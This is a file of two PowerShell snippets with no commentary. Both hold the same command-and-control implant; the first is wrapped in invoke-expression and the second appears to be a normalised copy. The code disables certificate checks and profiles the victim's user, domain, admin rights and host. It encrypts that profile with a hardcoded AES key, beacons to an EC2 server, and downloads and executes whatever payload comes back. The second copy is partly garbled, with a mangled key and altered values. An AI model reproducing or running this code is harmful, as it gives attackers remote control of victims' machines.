# powershell snippet 0
invoke-expression "[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}\n$df=@(\"\")\n$h=\"\"\n$sc=\"\"\n$urls=@(\"http://ec2-54-91-111-47.compute-1.amazonaws.com:4455\")\n$curl=\"/putil/2018/0/11/po.html/\"\n$s=$urls[0]\nfunction CAM ($key,$IV){\ntry {$a = New-Object \"System.Security.Cryptography.RijndaelManaged\"\n} catch {$a = New-Object \"System.Security.Cryptography.AesCryptoServiceProvider\"}\n$a.Mode = [System.Security.Cryptography.CipherMode]::CBC\n$a.Padding = [System.Security.Cryptography.PaddingMode]::Zeros\n$a.BlockSize = 128\n$a.KeySize = 256\nif ($IV)\n{\nif ($IV.getType().Name -eq \"String\")\n{$a.IV = [System.Convert]::FromBase64String($IV)}\nelse\n{$a.IV = $IV}\n}\nif ($key)\n{\nif ($key.getType().Name -eq \"String\")\n{$a.Key = [System.Convert]::FromBase64String($key)}\nelse\n{$a.Key = $key}\n}\n$a}\nfunction ENC ($key,$un){\n$b = [System.Text.Encoding]::UTF8.GetBytes($un)\n$a = CAM $key\n$e = $a.CreateEncryptor()\n$f = $e.TransformFinalBlock($b, 0, $b.Length)\n[byte[]] $p = $a.IV + $f\n[System.Convert]::ToBase64String($p)\n}\nfunction DEC ($key,$enc){\n$b = [System.Convert]::FromBase64String($enc)\n$IV = $b[0..15]\n$a = CAM $key $IV\n$d = $a.CreateDecryptor()\n$u = $d.TransformFinalBlock($b, 16, $b.Length - 16)\n[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String([System.Text.Encoding]::UTF8.GetString($u).Trim([char]0)))}\nfunction Get-Webclient ($Cookie) {\n$d = (Get-Date -Format \"yyyy-MM-dd\");\n$d = [datetime]::ParseExact($d,\"yyyy-MM-dd\",$null);\n$k = [datetime]::ParseExact(\"2999-12-01\",\"yyyy-MM-dd\",$null);\nif ($k -lt $d) {exit}\n$username = \"\"\n$password = \"\"\n$proxyurl = \"\"\n$wc = New-Object System.Net.WebClient;\n\nif ($h -and (($psversiontable.CLRVersion.Major -gt 2))) {$wc.Headers.Add(\"Host\",$h)}\nelseif($h){$script:s=\"https://$($h)/putil/2018/0/11/po.html/\";$script:sc=\"https://$($h)\"}\n$wc.Headers.Add(\"User-Agent\",\"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.122 Safari/537.36\")\n$wc.Headers.Add(\"Referer\",\"\")\nif ($proxyurl) {\n$wp = New-Object System.Net.WebProxy($proxyurl,$true);\nif ($username -and $password) {\n$PSS = ConvertTo-SecureString $password -AsPlainText -Force;\n$getcreds = new-object system.management.automation.PSCredential $username,$PSS;\n$wp.Credentials = $getcreds;\n} else { $wc.UseDefaultCredentials = $true; }\n$wc.Proxy = $wp; } else {\n$wc.UseDefaultCredentials = $true;\n$wc.Proxy.Credentials = $wc.Credentials;\n} if ($cookie) { $wc.Headers.Add([System.Net.HttpRequestHeader]::Cookie, \"SessionID=$Cookie\") }\n$wc}\nfunction primern($url,$uri,$df) {\n$script:s=$url+$uri\n$script:sc=$url\n$script:h=$df\n$cu = [System.Security.Principal.WindowsIdentity]::GetCurrent()\n$wp = New-Object System.Security.Principal.WindowsPrincipal($cu)\n$ag = [System.Security.Principal.WindowsBuiltInRole]::Administrator\n$procname = (Get-Process -id $pid).ProcessName\nif ($wp.IsInRole($ag)){$el=\"*\"}else{$el=\"\"}\ntry{$u=($cu).name+$el} catch{if ($env:username -eq \"$($env:computername)$\"){}else{$u=$env:username}}\n$o=\"$env:userdomain;$u;$env:computername;$env:PROCESSOR_ARCHITECTURE;$pid;$procname;1\"\ntry {$pp=enc -key dxQYeQ/csVJd1YvY3KcorzsrI67QFnSeuJgpz0LbAcA= -un $o} catch {$pp=\"ERROR\"}\n$primern = (Get-Webclient -Cookie $pp).downloadstring($script:s)\n$p = dec -key dxQYeQ/csVJd1YvY3KcorzsrI67QFnSeuJgpz0LbAcA= -enc $primern\nif ($p -like \"*key*\") {$p| iex}\n}\nfunction primers {\nif(![string]::IsNullOrEmpty(\"\") -and ![Environment]::UserDomainName.Contains(\"\"))\n{\n    return;\n}\nforeach($url in $urls){\n$index = [array]::IndexOf($urls, $url)\ntry {primern $url $curl $df[$index]} catch {write-output $error[0]}}}\n$limit=30\nif($true){\n    $wait = 60\n    while($true -and $limit -gt 0){\n        $limit = $limit -1;\n        primers\n        Start-Sleep $wait\n        $wait = $wait * 2;\n    }\n}\nelse\n{\n    primers\n}\n"
# powershell snippet 1
[system.net.servicepointmanager]::servercertificatevalidationcallback = {$true}
$df = ""
$h = ""
$sc = ""
$urls = "http://ec2-54-91-111-47.compute-1.amazonaws.com:4455"
$curl = "/putil/2018/0/11/po.html/"
$s = "http://ec2-54-91-111-47.compute-1.amazonaws.com:4455"
function cam($key, $iv) {
  try {
    $a = new-object "System.Security.Cryptography.RijndaelManaged"
  } catch {
    $a = new-object "System.Security.Cryptography.AesCryptoServiceProvider"
  }
  $a.mode = [system.security.cryptography.ciphermode]::cbc
  $a.padding = [system.security.cryptography.paddingmode]::zeros
  $a.blocksize = 128
  $a.keysize = 256
  if ($iv) {
    if (($iv.gettype()).name -eq "String") {
      $a.iv = [system.convert]::frombase64string($iv)
} else {
      $a.iv = $iv
    }
  }
  if ($key) {
    if (($key.gettype()).name -eq "String") {
      $a.key = [system.convert]::frombase64string($key)
} else {
      $a.key = $key
    }
  }
  $a
}
function enc($key, $un) {
  $b = ([system.text.encoding]::ascii).getbytes($un)
  $a = cam $key
  $e = $a.createencryptor()
  $f = $e.transformfinalblock($b, 0, $b.length)
  [byte[]]$p = $a.iv + $f
  [system.convert]::tobase64string($p)
}
function dec($key, $enc) {
  $b = [system.convert]::frombase64string($enc)
  $iv = $b[(0..15)]
  $a = cam $key $iv
  $d = $a.createdecryptor()
  $u = $d.transformfinalblock($b, 16, $b.length - 16)
  ([system.text.encoding]::ascii).getstring([system.convert]::frombase64string((([system.text.encoding]::ascii).getstring($u)).trim("\x00")))
}
function get-webclient($cookie) {
  $d = get-date -format "yyyy-MM-dd"
  $d = [datetime]::parseexact($d, "yyyy-MM-dd", $null)
  $k = [datetime]::parseexact("2999-12-01", "yyyy-MM-dd", $null)
  if ($k -lt $d) {
    exit
  }
  $username = ""
  $password = ""
  $proxyurl = ""
  $wc = new-object system.net.webclient
  if ($h -and $psversiontable.clrversion.major -gt 2) {
    ($wc.headers).add("Host", "")
  }
  ("", {$script:s = "https://$($h)/putil/2018/0/11/po.html/", $script:sc = "https://$($h)"})
  ($wc.headers).add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.122 Safari/537.36")
  ($wc.headers).add("Referer", "")
  if ($proxyurl) {
    $wp = new-object system.net.webproxy $proxyurl, $true
    if ($username -and $password) {
      $pss = convertto-securestring "" -asplaintext -force
      $getcreds = new-object system.management.automation.pscredential $username, $pss
      $wp.credentials = $getcreds
} else {
      $wc.usedefaultcredentials = $true
    }
    $wc.proxy = $wp
} else {
    $wc.usedefaultcredentials = $true
    $wc.proxy.credentials = $wc.credentials
  }
  if ($cookie) {
    ($wc.headers).add([system.net.httprequestheader]::cookie, "SessionID=$Cookie")
  }
  $wc
}
function primern($url, $uri, $df) {
  $script:s = $url + $uri
  $script:sc = $url
  $script:h = $df
  $cu = [system.security.principal.windowsidentity]::getcurrent()
  $wp = new-object system.security.principal.windowsprincipal $cu
  $ag = [system.security.principal.windowsbuiltinrole]::administrator
  $procname = (get-process -id 1337).processname
  if ($wp.isinrole($ag)) {
    $el = "*"
} else {
    $el = ""
  }
  try {
    $u = $cu.name + $el
  } catch {
    if ($env:username -eq "$($env:computername)$") {
} else {
      $u = $env:username
    }
  }
  $o = "$env:userdomain;$u;$env:computername;$env:PROCESSOR_ARCHITECTURE;$pid;$procname;1"
  try {
    $pp = enc -key dxqyeq  csvjd1yvy3kcorzsri67qfnseujgpz0lbaca  -un $o
  } catch {
    $pp = "ERROR"
  }
  $primern = (get-webclient -cookie $pp).downloadstring($script:s)
  $p = dec -key dxqyeq  csvjd1yvy3kcorzsri67qfnseujgpz0lbaca  -enc $primern
  if ($p -like "*key*") {
    $p|invoke-expression
  }
}
function primers {
  if (![string]::isnullorempty("") -and !([environment]::userdomainname).contains("")) {
    return 
  }
  foreach ($url in $urls) {
    $index = [array]::indexof("http://ec2-54-91-111-47.compute-1.amazonaws.com:4455", $url)
    try {
      primern $url "/putil/2018/0/11/po.html/" $df[$index]
    } catch {
      write-output $error[0]
    }
  }
}
$limit = 30
if ($true) {
  $wait = 60
  while ($true -and $limit -gt 0) {
    $limit = $limit - 1
    primers
    start-sleep 60
    $wait = $wait * 2
  }
} else {
  primers
}
